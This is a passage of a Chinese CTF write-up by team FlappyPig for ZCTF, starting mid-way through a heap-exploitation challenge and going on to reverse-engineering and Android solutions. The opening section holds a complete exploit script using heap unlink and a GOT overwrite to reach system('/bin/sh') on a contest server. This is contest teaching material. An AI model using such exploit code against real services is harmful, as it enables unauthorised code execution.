<p>get_buff_4008DD(global_content_size_6020C8[id_t], (__int64)(&amp;global_cur_ptr_6020C0)[8 * (id_t + 8)], 10);</p>
<p>global_cur_ptr_6020C0 = global_content_size_6020C8[id_t];</p>
<p>在这里可以采用unlink的方式,在内容中构造假堆块,最终改写全局指针。</p>
<p>利用代码如下:<br />
[code]<br />
__author__ = &quot;pxx&quot;<br />
from zio import *<br />
from pwn import *<br />
#ip = 1.192.225.129<br />
#target = &quot;./note3&quot;<br />
target = (&quot;115.28.27.103&quot;, 9003)<br />
def get_io(target):<br />
r_m = COLORED(RAW, &quot;green&quot;)<br />
w_m = COLORED(RAW, &quot;blue&quot;)<br />
io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)<br />
return  io<br />
def new_note(io, length_t, content_t):<br />
io.read_until(&quot;option---&gt;&gt;\n&quot;)<br />
io.writeline(&quot;1&quot;)<br />
io.read_until(&quot;content:(less than 1024)\n&quot;)<br />
io.writeline(str(length_t))<br />
io.read_until(&quot;content:\n&quot;)<br />
io.writeline(content_t)<br />
def delete_note(io, id_t):<br />
io.read_until(&quot;option---&gt;&gt;\n&quot;)<br />
io.writeline(&quot;4&quot;)<br />
io.read_until(&quot;id of the note:\n&quot;)<br />
io.writeline(str(id_t))<br />
def edit_note(io, id_t, content_t):<br />
io.read_until(&quot;option---&gt;&gt;\n&quot;)<br />
io.writeline(&quot;3&quot;)<br />
io.read_until(&quot;id of the note:\n&quot;)<br />
io.writeline(str(id_t))<br />
io.read_until(&quot;content:&quot;)<br />
io.writeline(content_t)<br />
def pwn(io):<br />
new_note(io, 0x80, 'aaaaaa')<br />
new_note(io, 0x80, 'bbbbbb')<br />
new_note(io, 0x80, 'cccccc')<br />
new_note(io, 0x80, 'dddddd')<br />
new_note(io, 0x80, 'eeeeee')<br />
new_note(io, 0x80, 'ffffff')<br />
new_note(io, 0x80, '/bin/sh;')<br />
target_id = 2<br />
edit_note(io, target_id, '111111')<br />
#useful_code --- begin<br />
#prepare args<br />
arch_bytes = 8<br />
heap_buff_size = 0x80<br />
#node1_addr = &amp;p0<br />
node1_addr = 0x6020C8 + 0x08 * target_id<br />
pack_fun = l64<br />
heap_node_size = heap_buff_size + 2 * arch_bytes #0x88<br />
p0 = pack_fun(0x0)<br />
p1 = pack_fun(heap_buff_size + 0x01)<br />
p2 = pack_fun(node1_addr - 3 * arch_bytes)<br />
p3 = pack_fun(node1_addr - 2 * arch_bytes)<br />
#p[2]=p-3<br />
#p[3]=p-2<br />
#node1_addr = &amp;node1_addr - 3<br />
node2_pre_size = pack_fun(heap_buff_size)<br />
node2_size = pack_fun(heap_node_size)<br />
data1 = p0 + p1 + p2 + p3 + &quot;&quot;.ljust(heap_buff_size - 4 * arch_bytes, '1') + node2_pre_size + node2_size<br />
#useful_code --- end<br />
#edit node 1:overwrite node 1 -&gt; overflow node 2<br />
edit_note(io, -9223372036854775808, data1)<br />
#edit_note(io, 1, score, data1)<br />
#delete node 2, unlink node 1 -&gt; unlink<br />
#delete_a_restaurant(io, 2)<br />
delete_note(io, target_id + 1)<br />
alarm_got = 0x0000000000602038<br />
puts_plt = 0x0000000000400730<br />
free_got = 0x0000000000602018<br />
data1 = l64(0x0) + l64(alarm_got) + l64(free_got) + l64(free_got)<br />
edit_note(io, target_id, data1)<br />
data1 = l64(puts_plt)[:6]<br />
io.gdb_hint()<br />
edit_note(io, target_id, data1)<br />
#io.read_until(&quot;option---&gt;&gt;\n&quot;)<br />
#io.writeline(&quot;3&quot;)<br />
#io.read_until(&quot;id of the note:\n&quot;)<br />
#io.writeline(l64(atol_got))<br />
#data = io.read_until(&quot;\n&quot;)<br />
#print [c for c in data]<br />
delete_note(io, 0)<br />
data = io.read_until(&quot;\n&quot;)[:-1]<br />
print [c for c in data]<br />
alarm_addr = l64(data.ljust(8, '\x00'))<br />
print &quot;alarm_addr:&quot;, hex(alarm_addr)<br />
elf_info = ELF(&quot;./libc-2.19.so&quot;)<br />
#elf_info = ELF(&quot;./libc.so.6&quot;)<br />
alarm_offset = elf_info.symbols[&quot;alarm&quot;]<br />
system_offset = elf_info.symbols[&quot;system&quot;]<br />
libc_base = alarm_addr - alarm_offset<br />
system_addr = libc_base + system_offset<br />
data = l64(system_addr)[:6]<br />
edit_note(io, 1, data)<br />
delete_note(io, 6)<br />
io.interact()<br />
io = get_io(target)<br />
pwn(io)<br />
[/code]</p>
<p>结果:</p>
<p><a href="http://p2.qhimg.com/t010e3ec688833ca85c.png" target="_blank"><img title="t010e3ec688833ca85c.png" src="http://p2.qhimg.com/t010e3ec688833ca85c.png" alt="http://p2.qhimg.com/t010e3ec688833ca85c.png" /></a></p>
<p>flag: ZCTF{No_s1-1Ow_n0dfs_1eak!@#}</p>
<p>&nbsp;</p>
<h2><strong>REVERSE</strong></h2>
<h3><span style="color: #ff6600;">Reverese100</span></h3>
<p>这个题最开始是个矩阵运行,算了半天算出来flag为zctf{Wrong_Flag},明显不对。继续往后分析,真正的代码在后面。<br />
[code]<br />
value = '32 02 00 00 85 02 00 00 F4 02 00 00 53 03 00 00 98 03 00 00 F9 03 00 00 6C 04 00 00 E5 04 00 00 44 05 00 00 93 05 00 00 FB 05 00 00 5A 06 00 00 A1 06 00 00 10 07 00 00 74 07 00 00 F1 07 00 00'<br />
d = ''<br />
for l in value.split(' '):<br />
    d += chr(int(l, 16))<br />
print len(d)<br />
from zio import *<br />
d2 = []<br />
d0 = ord('z')+ord('c')+ord('t')+ord('f')<br />
d2.append(d0)<br />
for i in range(len(d)/4):<br />
    d2.append(l32(d[i*4:i*4+4]))<br />
flag = ''<br />
for i in range(len(d2)-1):<br />
    flag += chr(d2[i+1]-d2[i])<br />
print 'zctf'+flag<br />
Reverse200<br />
Flag形式如下:ZCTF{123_4567_abc_defghijklm}<br />
其中123对应的md5为371265e33e8d751d93b148067c36eb4c,对应的3的字符为c0c<br />
4567处对应的4个字符+一个’\x00’的md5为'03d2370991fbbb9101dd7dcf4b03d619',求得4567处对应LIK3.<br />
md5str = '03d2370991fbbb9101dd7dcf4b03d619'<br />
for a1 in range(0x20, 0x7f):<br />
    for a2 in range(0x20, 0x7f):<br />
        for a3 in range(0x20, 0x7f):<br />
            for a4 in range(0x20, 0x7f):<br />
                src = chr(a1) + chr(a2) + chr(a3) + chr(a4) + '\x00'<br />
                m2 = hashlib.md5()<br />
                m2.update(src)<br />
                if m2.hexdigest() == md5str:<br />
                    print 'find'<br />
print src<br />
[/code]</p>
<p>abc处的3个字符做了base64加密之后进行比较,求得为E4t.</p>
<p>经过上面的比较后,程序用de处的两个字符对subkey文件内容进行异或,输出到subsubkey中。</p>
<p>再后面对整个flag做了次md5。但是因为整个flag中有10个字节不知道,爆破不太现实。</p>
<p>感觉subsubkey文件应该是有意义的,通过枚举de处的所有可能,得到所有的输出,通过file命令发现当de为ST时,subsubkey为一个rar文件,解压出来有剩下的8个字符。</p>
<p>Flag为:ZCTF{c0c_LIK3_E4t_ST6aw4ErrY}E4t.</p>
<p>&nbsp;</p>
<h3><span style="color: #ff6600;">Reverse300</span></h3>
<p>Arm64的程序,最近新出的ida6.9支持arm64反编译,不过可惜没有正版ida。</p>
<p>看了下主要函数就几个,所以选择直接看汇编了。结合qemu,可以进行动态调试。</p>
<p>首先,ida对arm64程序的库函数识别不是很好(用的ida6.6),通过readelf解析出来的库函数对ida中的库函数手动修正。</p>
<p>之后就是纯看代码了,大概弄清楚了程序流程:</p>
<p>首先将输入的字符串每3个一组,变换成4个字节,得到buff2.</p>
<p>Buff2中每5个字节一组,做了一个矩阵乘法,得到buff3.</p>
<p>Buff3与固定字符串比较。代码大致如下:<br />
[code]<br />
flag = 'zctf{1234567890}'.ljust(18, '\x00')<br />
d9 = []<br />
for i in range(len(flag)/3):<br />
    d  = (ord(flag[3*i])&lt;&lt;16)+(ord(flag[3*i+1])&lt;&lt;8)+ord(flag[3*i+2])<br />
    #print d,<br />
    d1 = (d&gt;&gt;18)&amp;0x3f<br />
    d2 = (d&gt;&gt;12)&amp;0x3f<br />
    d3 = (d&gt;&gt;6)&amp;0x3f<br />
    d4 = d &amp; 0x3f<br />
    print hex(d1), hex(d2), hex(d3), hex(d4)<br />
    if d1 != 0:<br />
        d9.append(d1)<br />
    if d2 != 0:<br />
        d9.append(d2)<br />
    if d3 != 0:<br />
        d9.append(d3)<br />
    else:<br />
        d9.append(0x40)<br />
    if d4 != 0:<br />
        d9.append(d4)<br />
    else:<br />
        d9.append(0x40)<br />
d8 = [21, 8, 24, 7, 1, 25, 4, 20, 16, 0, 2, 13, 16, 10, 14, 18, 3, 20, 18, 25, 3, 12, 23, 0, 24]<br />
for i in range(len(d9)/5):<br />
    for j in range(5):<br />
        a = d9[i*5]*d8[j*5]+d9[i*5+1]*d8[j*5+1]+d9[i*5+2]*d8[j*5+2]+d9[i*5+3]*d8[j*5+3]+d9[i*5+4]*d8[j*5+4]<br />
        print hex(a)<br />
[/code]</p>
<p>逆向代码:<br />
[code]<br />
m = [[21.0, 8.0, 24.0, 7.0, 1.0], [25.0, 4.0, 20.0, 16.0, 0.0],\<br />
     [2.0, 13.0, 16.0, 10.0, 14.0], [18.0, 3.0, 20.0, 18.0, 25.0], [3.0, 12.0, 23.0, 0.0, 24.0]]<br />
flag_lists = [[1219.0, 1274.0, 1158.0, 1549.0, 1205.0], [2777.0, 2771.0, 2387.0, 3440.0, 2833.0],\<br />
              [1422.0, 1753.0, 1723.0, 2369.0, 1483.0], [2071.0, 2283.0, 1936.0, 3483.0, 2435.0]]<br />
for flag in flag_lists:<br />
    result3 = mat(m)**-1 * mat(flag).T<br />
print result3<br />
sbs = '''<br />
   22.0000<br />
   36.0000<br />
   13.0000<br />
   20.0000<br />
   17.0000<br />
   39.0000<br />
   45.0000<br />
   56.0000<br />
   31.0000<br />
   37.0000<br />
   21.0000<br />
   47.0000<br />
    8.0000<br />
   55.0000<br />
   28.0000<br />
   51.0000<br />
   26.0000<br />
   22.0000<br />
   29.0000<br />
   61.0000<br />
'''<br />
res2 = []<br />
for sb in sbs.strip().split('\n'):<br />
    res2.append(int(sb.split('.')[0]))<br />
for res in res2:<br />
    print hex(res), hex(res&amp;0x3f)<br />
from zio import *<br />
flag = ''<br />
for i in range(len(res2)/4):<br />
    result = (res2[i*4]&lt;&lt;18)+(res2[i*4+1]&lt;&lt;12)+(res2[i*4+2]&lt;&lt;6)+res2[i*4+3]<br />
    flag += l32(result)[0:3][::-1]<br />
print flag<br />
[/code]</p>
<p>解得flag为: ZCTF{x~Uo#w3ig}</p>
<p>&nbsp;</p>
<h3><span style="color: #ff6600;">Reverse500</span></h3>
<p>创建了一个子进程,首先对主进程对输入的数据进行了变换,变换后放到004079D8处,然后子进程再进行判断。</p>
<p>父进程中变换的函数使用一堆jmp进行了混淆。</p>
<p>通过记录程序运行的eip,然后再进行分析,分析发现就是个base64解密,然后挨着的两两字符异或,得到buff2。</p>
<p>在子进程中,将buff2[i]^i与固定字符串比较。<br />
[code lang="python"]<br />
f = open('./reverse500.exe', 'rb')<br />
d = f.read()[0x506c:0x506c+54]<br />
result = ''<br />
for i in range(53):<br />
    result += chr(ord(d[i])^i)<br />
result2 = ''<br />
result2 += result[0]<br />
for i in range(52):<br />
    result2 += chr(ord(result2[i])^ord(result[i+1]))<br />
print result2<br />
print base64.b64decode('WkNURntJX1c0TlRfSm1QX2pNcF8mJl9CNFMxXzY0X0BeX15AIX0=')<br />
[/code]</p>
<p>得到flag为:ZCTF{I_W4NT_JmP_jMp_&amp;&amp;_B4S1_64_@^_^@!}</p>
<p>Simulator</p>
<p>实现了一个简单的虚拟机(或者叫模拟器)。</p>
<p>定位到虚拟机初始化的地方:</p>
<p><a href="http://p6.qhimg.com/t01d189da0c04f1e861.png" target="_blank"><img title="t01d189da0c04f1e861.png" src="http://p6.qhimg.com/t01d189da0c04f1e861.png" alt="http://p6.qhimg.com/t01d189da0c04f1e861.png" /></a></p>
<p>通过之后的分析,可以猜出vreg、vpc、vsp、vflag和vmem。</p>
<p>之后一共支持24条指令:<br />
[code lang="asm"]<br />
0  initvm<br />
1  mov regi, imm  a1!=0<br />
mov regi, regj  a1=0<br />
2: a1 == 0: mov regi, byte [regj]<br />
a1 == 1: mov regi, word [regj]<br />
a1 == 2: mov regi, dword [regj]<br />
3: a1 == 0: mov byte [regj], regi<br />
a1 == 1: mov word [regj], regi<br />
a1 == 2: mov dword [regj], regi<br />
4.  pop regi<br />
5.  push regi<br />
6.  a1 == 0: print regi #c<br />
a1 == 1: print regi #d<br />
a1 == 2: print regi #x<br />
a1 == 3: print vmem[regi]<br />
7.  a1 == 0: scanf regi #c<br />
a1 == 1: scanf regi #d<br />
a1 == 2: scanf regi #x<br />
a1 == 3: scanf vmem[regi]<br />
8.  ret<br />
9.  a1 == 0  jmp imm<br />
a1 == 1: jz imm<br />
a1 == 2  jnz imm<br />
a1 == 3: jl imm<br />
10. a1 == 0:  jmp regi<br />
a1 == 1: jz regi<br />
a1 == 2  jnz regi<br />
a1 == 3: jl regi<br />
11. a1 != 0:  add regi, imm<br />
a1 == 0: add regi, regj<br />
12. sub<br />
13. and<br />
14. or<br />
15. xor<br />
16. cmp<br />
17. exit<br />
18. a1 == 0: mov regi, byte mem[regj]<br />
a1 == 1:mov regi, word mem[regj]<br />
a1 == 2:mov regi, dword mem[regj]<br />
19. a1 == 0: mov byte mem[regj], regi<br />
a1 == 1:mov word mem[regj], regi<br />
a1 == 2:mov dword mem[regj], regi<br />
20. a1 != 0:call imm<br />
a1 == 0:call regi<br />
21 nop<br />
22  inc regi<br />
23  dec regi<br />
24  test regi, regj<br />
[/code]</p>
<p>根据逆向出来的指令格式,去反汇编分析input.bin。</p>
<p>程序逐字节累加,然后比较。<br />
[code lang="python"]<br />
adds = [68, 116, 211, 300, 411, 529, 624, 673, 706, 813, 864, 959, 1014, 1086, 1137, 1232, 1285, 1390, 1499, 1616]<br />
value = 0<br />
result = ''<br />
for add in adds:<br />
    result += chr(add-value)<br />
    value = add<br />
print 'result:'+result<br />
[/code]</p>
<p>求得结果为D0_Yov_1!k3_7H3_5imu</p>
<p>最后6个字节的比较麻烦一些,直接用z3求解了。<br />
[code lang="python"]<br />
from z3 import *<br />
r10 = Real('r10')<br />
r11 = Real('r11')<br />
r12 = Real('r12')<br />
r13 = Real('r13')<br />
r14 = Real('r14')<br />
r15 = Real('r15')<br />
s = Solver()<br />
s.add(r10 + r11 == 0x65)<br />
s.add(r12 + r13 == 0x109-0x65)<br />
s.add(r14 + r15 == 0x1ba-0x109)<br />
s.add(r11 + r13 + r15 == 0xa3)<br />
s.add(r10 + r12 == 0x148-0xa3)<br />
s.add(r11 + r12 == 0xa8)<br />
print(s.check())<br />
print(s.model())<br />
[/code]</p>
<p>最终flag为: zctf{D0_Yov_1!k3_7H3_5imu14t0r?}</p>
<h3><span style="color: #ff6600;">Android400</span></h3>
<p>本apk为2048的游戏修改版,玩到一定的分数就会弹出输入flag的窗口,flag窗口的activity为Secret,该类会载入Auth这个lib</p>
<p><a href="http://p4.qhimg.com/t016ad1df58af2dd81b.png" target="_blank"><img title="t016ad1df58af2dd81b.png" src="http://p4.qhimg.com/t016ad1df58af2dd81b.png" alt="http://p4.qhimg.com/t016ad1df58af2dd81b.png" /></a></p>
<p>观察其create函数,重点看最后一行setOnClickListener,其绑定的按钮监听器为i</p>
<p><a href="http://p1.qhimg.com/t018a7a9c35720dc6ad.png" target="_blank"><img title="t018a7a9c35720dc6ad.png" src="http://p1.qhimg.com/t018a7a9c35720dc6ad.png" alt="http://p1.qhimg.com/t018a7a9c35720dc6ad.png" /></a></p>
<p>跟进类i的onClick函数,其中下面这段语句干了很多事。j.b函数取得了该apk的签名存到v1,重点看最后一行this.a.a的调用。</p>
<p><a href="http://p7.qhimg.com/t01880cdf815d86524e.png" target="_blank"><img title="t01880cdf815d86524e.png" src="http://p7.qhimg.com/t01880cdf815d86524e.png" alt="http://p7.qhimg.com/t01880cdf815d86524e.png" /></a></p>
<p>this.a.a函数实际调用Secret.a函数,该函数中主要的语句是下面这条。</p>
<p><a href="http://p2.qhimg.com/t01cfec54e4c5dc1ebd.png" target="_blank"><img title="t01cfec54e4c5dc1ebd.png" src="http://p2.qhimg.com/t01cfec54e4c5dc1ebd.png" alt="http://p2.qhimg.com/t01cfec54e4c5dc1ebd.png" /></a></p>
<p>其中Secret.a函数取得assets目录下的libListerner文件的内容,h.a函数将libListerner文件的内容用之前取得的签名作为密钥进行des解密,h.b函数将解密后的内容写入/data/data/com.zctf.zctf2048/libListener,也就是说这里如果想自己重新编译apk的话会比较麻烦。</p>
<p>随后程序调用h.a运行libListerner</p>
<p><a href="http://p0.qhimg.com/t014266806305586a13.png" target="_blank"><img title="t014266806305586a13.png" src="http://p0.qhimg.com/t014266806305586a13.png" alt="http://p0.qhimg.com/t014266806305586a13.png" /></a></p>
<p><a href="http://p4.qhimg.com/t01ffe02f5ed2b8adf9.png" target="_blank"><img title="t01ffe02f5ed2b8adf9.png" src="http://p4.qhimg.com/t01ffe02f5ed2b8adf9.png" alt="http://p4.qhimg.com/t01ffe02f5ed2b8adf9.png" /></a></p>
<p>随后程序会调用本地函数进行进一步处理。</p>
<p><a href="http://p4.qhimg.com/t0187f092b0752b2bf2.png" target="_blank"><img title="t0187f092b0752b2bf2.png" src="http://p4.qhimg.com/t0187f092b0752b2bf2.png" alt="http://p4.qhimg.com/t0187f092b0752b2bf2.png" /></a></p>
<p>用ida打开libAuth.so,跟进到程序Java_com_zctf_zctf2048_Auth_AskForAnswer调用的地方。其取得了传入的字符串后调用了sendAndAsk函数</p>
<p><a href="http://p9.qhimg.com/t01c58ca163a7a95824.png" target="_blank"><img title="t01c58ca163a7a95824.png" src="http://p9.qhimg.com/t01c58ca163a7a95824.png" alt="http://p9.qhimg.com/t01c58ca163a7a95824.png" /></a></p>
<p>跟进查看,发现程序尝试连接本机的8000端口(转成小端为8000),</p>
<p><a href="http://p0.qhimg.com/t0163585a89ba1f429e.png" target="_blank"><img title="t0163585a89ba1f429e.png" src="http://p0.qhimg.com/t0163585a89ba1f429e.png" alt="http://p0.qhimg.com/t0163585a89ba1f429e.png" /></a></p>
<p>并进行tea加密。</p>
<p><a href="http://p2.qhimg.com/t015fb62cf3fc7a021c.png" target="_blank"><img title="t015fb62cf3fc7a021c.png" src="http://p2.qhimg.com/t015fb62cf3fc7a021c.png" alt="http://p2.qhimg.com/t015fb62cf3fc7a021c.png" /></a></p>
<p>最后传输过去</p>
<p><a href="http://p3.qhimg.com/t01e4c5d313b7b684ae.png" target="_blank"><img title="t01e4c5d313b7b684ae.png" src="http://p3.qhimg.com/t01e4c5d313b7b684ae.png" alt="http://p3.qhimg.com/t01e4c5d313b7b684ae.png" /></a></p>
<p>可以推测libListerner会监听8000端口,做进一步处理</p>
<p>用ida打开liblistener之后,定位到main函数,发现不是很复杂,就直接静态看了。</p>
<p>首先进行了tea算法,然后进行了变形base64,然后做了一个简单的变换。</p>
<p>在解密的过程中,发现变形base64解密完成之后,就已经得到flag了,(tea解密都不用算)。</p>
<p>[code lang="python"]<br />
table = [87, 12, 4294967283L, 4294967291L, 4294967282L, 15, 4294967262L, 68, 4294967293L, 4294967253L, 27, 4294967274L, 13, 4294967287L, 26, 11, 4294967229L, 36, 4294967268L, 58, 0, 4294967236L, 64, 4294967233L, 57, 4294967239L, 17, 2, 11, 4294967293L, 23, 4294967247L]<br />
def sub_8c20(a1, a2):<br />
    v2 = 87<br />
    if a2:<br />
        v2 = 65<br />
        if a2 &lt;= 31:<br />
            v2 = (a1 + table[a2])&amp;0xff<br />
    return v2<br />
v6 = 65<br />
result = ''<br />
for i in range(32):<br />
    v6 = sub_8c20(v6, i)<br />
    result += chr(v6)<br />
print result<br />
str2 = &quot;GHgSTU45IMNesVlZadrXf17qBCJkxYWhijOyzbcR6tDPw023KLA8QEFuvmnop9+/&quot;<br />
import base64<br />
def get_index(ch):<br />
    for i in range(len(str2)):<br />
        if str2[i] == ch:<br />
            return i<br />
    raise Exception('error')<br />
flag = ''<br />
from zio import *<br />
for i in range(len(result)/4):<br />
    d1 = get_index(result[4*i])<br />
    d2 = get_index(result[4*i+1])<br />
    d3 = get_index(result[4*i+2])<br />
    d4 = get_index(result[4*i+3])<br />
    d = (d1&lt;&lt;18)+(d2&lt;&lt;12)+(d3&lt;&lt;6)+d4<br />
    flag += l32(d)[0:3][::-1]<br />
print flag<br />
[/code]</p>
<p>最终flag为zctf{i_d0N()T_L1k3_2048}</p>
<p>【原文：<a href="http://bobao.360.cn/ctf/detail/158.html" target="_blank">ZCTF Writeup</a> 作者：<strong>FlappyPig  安全脉搏编辑整理发布】</strong></p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/com-zctf-app" rel="tag">com.zctf.app</a><a href="https://www.secpulse.com/archives/tag/easy-injection" rel="tag">Easy Injection</a><a href="https://www.secpulse.com/archives/tag/flappypig" rel="tag">FlappyPig</a><a href="https://www.secpulse.com/archives/tag/gdb-dump" rel="tag">gdb dump</a><a href="https://www.secpulse.com/archives/tag/ldap%e6%b3%a8%e5%85%a5" rel="tag">ldap注入</a><a href="https://www.secpulse.com/archives/tag/reverese100" rel="tag">Reverese100</a><a href="https://www.secpulse.com/archives/tag/reverse" rel="tag">reverse</a><a href="https://www.secpulse.com/archives/tag/stegsolve" rel="tag">stegsolve</a><a href="https://www.secpulse.com/archives/tag/xctf-%e7%ab%9e%e8%b5%9b%e8%a7%84%e5%88%99" rel="tag">xctf 竞赛规则</a><a href="https://www.secpulse.com/archives/tag/zctf" rel="tag">ZCTF</a><a href="https://www.secpulse.com/archives/tag/zctf-writeup" rel="tag">zctf writeup</a><a href="https://www.secpulse.com/archives/tag/zctfnotthis" rel="tag">zctf{Notthis}</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/58354.html" title="详细阅读 2017第三届SSCTF全国网络安全大赛圆满结束">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/05/SSCTF.jpg&h=150&w=249&zc=1" alt="2017第三届SSCTF全国网络安全大赛圆满结束" class="xg-img"/>
		<p>2017第三届SSCTF全国网络安全大赛&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/50821.html" title="详细阅读 Backdoor CTF 2013 Writeup">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2015/09/1c950a7b02087bf4368086aaf1d3572c11dfcf01.jpg&h=150&w=249&zc=1" alt="Backdoor CTF 2013 Writeup" class="xg-img"/>
		<p>Backdoor CTF 2013 Wr&hellip;</P></a></li>
				<li><a href="https://www.secpulse.com/archives/50402.html" title="详细阅读 burpsuite实战指南(II)">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2015/12/Burpsuite1.6.27.png&h=150&w=249&zc=1" alt="burpsuite实战指南(II)" class="xg-img"/>
		<p>burpsuite实战指南(II)</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
	<h2 class="comments-title">
		抢沙发
	</h2>
			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='42334' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="0be7b21f8b" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="227"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/42334.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2017/01/spediator-150x150.jpg" width="96" height="96" alt="SP小编" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/sp_editor" title="由SP小编发布" rel="author">SP小编</a><br>
 <span class="au-title">总共218篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
交流和分享以及愉快的玩耍	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/23211.html" rel="bookmark" title="详细阅读 交通银行信息泄漏导致成功爆破进入邮箱系统">交通银行信息泄漏导致成功爆破进入邮箱系统</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/11053.html" rel="bookmark" title="详细阅读 中央国家机关住房资金管理中心 可修改住房公积金">中央国家机关住房资金管理中心 可修改住房公积金</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/19089.html" rel="bookmark" title="详细阅读 支付宝某服务可查用户真实姓名不需要是好友（零成本）">支付宝某服务可查用户真实姓名不需要是好友（零成本）</a></li>
